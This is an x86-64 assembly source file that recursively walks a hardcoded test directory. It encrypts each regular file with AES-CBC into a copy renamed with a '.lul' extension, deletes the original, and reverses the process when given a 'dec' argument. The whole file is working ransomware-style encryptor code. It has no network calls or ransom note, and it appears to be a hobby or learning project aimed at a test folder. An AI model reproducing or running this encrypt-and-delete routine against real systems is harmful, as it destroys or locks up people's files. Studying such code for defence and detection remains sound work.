%include "file.asm"
%include "dir.asm"
%include "aes.asm"

extern printf
extern strcmp
extern strcat
extern strncpy
extern sprintf
extern malloc
extern free 
extern memset
extern bzero
extern fstat

DIRENT_BUFF_SZ        equ 4096

OP_ENC                equ 0x00
OP_DEC                equ 0x01

; TODO
;       FREE ALLOCATED MEMORY

section .data
        openfile_error          db "Failed to open file",0xa,0x00
        openfile_error_len      equ $-openfile_error

        readdir_error           db "Failed to readdir",0xa,0x00
        readdir_error_len       equ $-readdir_error

        fmtReadFileFailed       db "Failed to read file '%s' error code %d", 0x0a, 0x00
 
        dirpath                 db "/home/frost/asm/testDir", 0x00
        
        newLine                 db 0xa, 0x00

        fmtPrintFilename        db "%s",0x0a, 0x00
        fmtHex                  db "%x", 0x0a, 0x00
        fmtDec                  db "%d", 0x0a, 0x00

        errFailedToMalloc       db "Failed to allocate memory", 0x0a, 0x00
        dotdotDir               db "..", 0x00
        dotDir                  db ".", 0x00
        
        newExtension            db ".lul", 0x00
        newExtLen               equ $-newExtension

        op                      db OP_ENC          ;encrypt = 0x00 or decrypt = 0x01
        decStrArg               db "dec", 0x00   ; argument used to decrypt files

        opFunction              dq AES_CBC_encrypt_buffer

        
        renameFunction          dq append_ext   ; function used to rename the file

section .bss
        file_fd                 resq 1          ; fd of the original file
        file_copy_fd            resq 1          ; fd of the encrypted file

        fileBuffer              resb BUFF_SZ
        originalFileSz          resq 1
        
        
global    main


section   .text
main:
        push    rbp
        mov     rbp, rsp
        
        cmp     rdi, 0x01
        je      _start_op

        ; check if should enc/decpryt
        mov     rdi, [rsi + 0x08]
        mov     rsi, decStrArg
        call    strcmp

        cmp     rax, 0x00
        jne     _start_op

_Dec:
        mov     BYTE[op], OP_DEC
        mov     QWORD[opFunction], AES_CBC_decrypt_buffer
        mov     QWORD[renameFunction], original_filename

_start_op:
       
        push    dirpath
        call    get_dir_files_rec
        jmp     exit_0


get_dir_files_rec:
        ; arguments
        directory               equ 0x10

        ; local variables
        bufferPtr               equ 0x10
        totalDirEntsSize        equ 0x18
        filePath                equ 0x20
        fileSize                equ 0x28

        push    rbp
        mov     rbp, rsp
        sub     rsp, 0x38

        ; allocate memory for dirents structs
        mov     rdi, DIRENT_BUFF_SZ
        call    malloc
        test    rax, rax
        jz      exit_0
        mov     QWORD[rbp - bufferPtr], rax


        ; allocate memory for file path
        mov     rdi, 0xff
        call    malloc
        test    rax, rax
        jz      exit_0
        mov     QWORD[rbp - filePath], rax

        push    DIRENT_BUFF_SZ
        push    QWORD[rbp - bufferPtr]
        push    QWORD[rbp + directory]       ; dir path
        call    get_dir_content

        cmp     rax, 0x00
        jg      read_dirent

        push    readdir_error_len
        push    readdir_error
        call    write_stdout

        jmp     _ret_get_dir_files

read_dirent:
        xor     r15, r15
        mov     QWORD[rbp-totalDirEntsSize], rax

read_next_dirent:
        mov     rbx, [rbp - bufferPtr]
        lea     rbx, [rbx + r15]

        lea     rsi, [rbx + DirEnt.d_name]

        
        ; check for ".." 
        mov     rdi, dotdotDir
        call    strcmp
        cmp     rax, 0x00
        je      _next_offset

        ; check for "."
        mov     rdi, dotDir
        call    strcmp
        cmp     rax, 0x00
        je      _next_offset



        push    rsi
        push    QWORD [rbp + directory]
        push    QWORD [rbp - filePath]
        call    join_file_path


        cmp     BYTE[rbx + DirEnt.d_type], DT_REG
        je      _read_next_file

        push    rsi
        push    rdi
        push    rax
        push    rbx
        push    rcx
        push    r15

        push    QWORD [rbp - filePath]
        call    get_dir_files_rec
        pop     r10

        pop     r15
        pop     rcx
        pop     rbx
        pop     rax
        pop     rdi
        pop     rsi


        jmp     _next_offset

_read_next_file:
        call    init_aes_ctx
       
        ;; open original file in readonly 
        push    0x00                                    ; no need for permissions
        push    O_RDONLY                                ; open mode
        push    QWORD [rbp - filePath]                            ; file path
        call    open_file

        cmp     rax, 0x00
        jle     openfile_failed
        mov     QWORD[file_fd], rax

        push    QWORD [rbp - filePath]          
        call    [renameFunction]

        push    rax

        mov     rdi, fmtPrintFilename
        mov     rsi, rax
        mov     rax, 0x00
        call    printf

        pop     rax
        ; create new file
        push    rax
        call    create_file

        cmp     rax, 0x00
        jle     openfile_failed

        mov     QWORD[file_copy_fd], rax
        
        cmp     rax, 0x00
        jle     _next_offset

        xor     r10, r10
        
        mov     rdi, fileBuffer
        mov     rsi, BUFF_SZ
        call    bzero 

_read_loop:

        push    BUFF_SZ - 0x10
        push    fileBuffer
        push    QWORD[file_fd]
        call    read_file

        cmp     rax, 0x00       
        jle      _close_files

        add     r10, rax
        push    rax
        cmp     byte[op], OP_DEC
        je      _write_copy

        ; check if its a multiple of 16
        ; same as r9 % 16
        mov     r9, rax
        and     r9, 0xF

        cmp     r9, 0x00
        je      _padd_new_block

        mov     r8, 0x10
        xchg    r9, r8
        sub     r9, r8

        lea     rdi, [fileBuffer + rax]
        add     rax, r9
        push    rax

        mov     rsi, r9
        mov     rdx, r9
        call    memset

        jmp     _write_copy

_padd_new_block:
        ; add a new 16 bytes block
        lea     rdi, [fileBuffer + rax]
        add     rax, 0x10
        push    rax

        mov     rsi, 0x10
        mov     rdx, 0x10
        call    memset



_write_copy:

        pop     rax
        push    rax
        ; encrypt data
        mov     rdi, aesCtx
        mov     rsi, fileBuffer
        mov     rdx, rax
        call    [opFunction]

        pop     rax

        cmp     byte[op], OP_ENC
        je      _write_data

        ; handle pkcs7 padding when decrypting
        xor     rcx, rcx
        mov     cl, byte[fileBuffer + rax - 1]
        sub     rax, rcx
        
_write_data:
        push    rax
        push    fileBuffer      ; buffer
        push    QWORD[file_copy_fd]             ; new file fd
        call    write_file

        jmp      _read_loop

_close_files:
        
        ; close the original file
        push    QWORD[file_fd]
        call    close_file

        push    QWORD[rbp - filePath]
        call    delete_file

        ; free filePath memory
        mov     rdi, QWORD[rbp - filePath]
        call    free

        ; close the encrypted file
        push    QWORD[file_copy_fd]
        call    close_file

_next_offset:
        ; get the size of this struct
        ; so we can get the next one
        lea     rcx, [rbx + DirEnt.d_reclen]
        movzx   rax, word[rcx]
        add     r15, rax
        
        cmp     r15, QWORD[rbp-totalDirEntsSize]
        jl      read_next_dirent
        
_ret_get_dir_files:

        ; free dirent buffer
        mov     rdi, QWORD[rbp - bufferPtr]
        call    free



        leave
        ret





openfile_failed:
        push    openfile_error_len
        push    openfile_error
        call    write_stdout

        jmp     exit_0    

readfile_failed:
        mov     rdi, fmtReadFileFailed
        mov     rsi, filePath
        mov     rcx, rax
        mov     rax, 0x00
        call    printf
        jmp     exit_0

exit_0:
        mov     rax, 60                 ; system call for exit
        xor     rdi, rdi                ; exit code 0
        syscall                           ; invoke operating system to exit


write_stdout:
        push    rbp
        mov     rbp, rsp

        push    QWORD [rbp + 0x18]
        push    QWORD [rbp + 0x10]
        
        push    STDOUT
        call    write_file

        leave    
        ret

        

;strlen function
__strlen:
    push        rbp
    mov         rbp, rsp


    push    rsi
    push    rcx
    push    rdi

    ;rdi str
    xor rcx, rcx                        ;set rcx to 0, will be used to count
    mov rsi, [rbp + 0x10]

_count:
    lodsb
    cmp al,0x00
    je _doneStrLen
    inc rcx
    jmp _count


_doneStrLen:
    mov rax, rcx

    pop rdi
    pop rcx
    pop rsi
    
    leave                                       ;destroy stackframe
    ret

append_ext:
        push    rbp
        mov     rbp, rsp

        ; save pointer to new allocated memory
        sub     rsp, 0x08

        push    rcx
        push    rdi
        push    rsi

        ; get the size of the filename
        push    QWORD[rbp + 0x10]               ; original filename
        call    __strlen

        cmp     rax, 0x00
        je      _append_done

        push    rax

        ; allocate memory
        lea     rdi, [rax + newExtLen + 1]
        call    malloc

        cmp     rax, 0x00
        je      _append_done
        mov     QWORD[rbp - 0x08], rax

        pop     rcx

        ; copy 'src' to new allocated memory
        mov     rdi, rax
        mov     rsi, QWORD[rbp + 0x10]

        rep     movsb


        ; append new extension
        mov     rcx, newExtLen
        mov     rsi, newExtension

        rep     movsb
        mov     rax, QWORD[rbp - 0x08]

_append_done:

        pop     rsi
        pop     rdi
        pop     rcx

        leave
        ret



original_filename:
        push    rbp
        mov     rbp, rsp
        
        push    QWORD[rbp + 0x10]
        call    __strlen

        cmp     rax, 0x00
        je      _ret_original_filename

        push    rax                         ;save string size

        mov     rdi, rax
        call    malloc

        cmp     rax, 0x00
        je      _ret_original_filename
        
        pop     r11                             ; string size

        mov     rdi, rax                        ; dst
        mov     rsi, QWORD[rbp + 0x10]          ; src
        lea     rdx, [r11 - newExtLen+1]      ; length
        call    strncpy

_ret_original_filename:
        leave
        ret
